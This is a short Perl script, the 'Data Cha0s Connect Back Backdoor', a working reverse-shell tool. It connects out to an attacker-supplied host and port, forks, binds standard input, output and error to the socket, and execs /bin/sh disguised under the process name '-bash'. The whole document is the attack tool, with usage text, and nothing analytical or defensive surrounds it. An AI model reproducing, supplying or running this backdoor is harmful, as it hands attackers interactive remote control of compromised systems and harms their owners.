#!/usr/bin/perl
      use Socket;
      print "Data Cha0s Connect Back Backdoor\n\n";
      if (!$ARGV[0]) {
        printf "Usage: $0 [Host] <Port>\n";
        exit(1);
      }
      print "[*] Dumping Arguments\n";
      $host = $ARGV[0];
      $port = 80;
      if ($ARGV[1]) {
        $port = $ARGV[1];
      }
      print "[*] Connecting...\n";
      $proto = getprotobyname('tcp') || die("Unknown Protocol\n");
      socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die ("Socket Error\n");
      my $target = inet_aton($host);
      if (!connect(SERVER, pack "SnA4x8", 2, $port, $target)) {
        die("Unable to Connect\n");
      }
      print "[*] Spawning Shell\n";
      if (!fork( )) {
        open(STDIN,">&SERVER");
        open(STDOUT,">&SERVER");
        open(STDERR,">&SERVER");
        exec {'/bin/sh'} '-bash' . "\0" x 4;
        exit(0);
      }
      print "[*] Datached\n\n";